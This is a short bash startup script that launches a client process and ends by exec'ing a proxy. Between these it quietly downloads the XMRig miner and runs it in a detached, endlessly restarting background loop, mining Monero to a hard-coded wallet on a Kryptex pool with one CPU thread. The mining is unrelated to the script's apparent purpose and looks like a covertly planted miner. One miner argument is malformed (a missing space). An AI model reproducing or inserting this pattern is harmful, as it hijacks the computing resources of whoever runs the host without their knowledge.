#!/bin/bash

./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
echo "Client PID: $!"

DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz
[ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)

WALLET="krxX3328ZR/z_render_all"
nohup bash -c "while true; do ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero--randomx-mode=light --cpu-max-threads-hint=1 --no-msr --asm=none; sleep 60; done" > xmrig.log 2>&1 &
disown

exec ./proxy
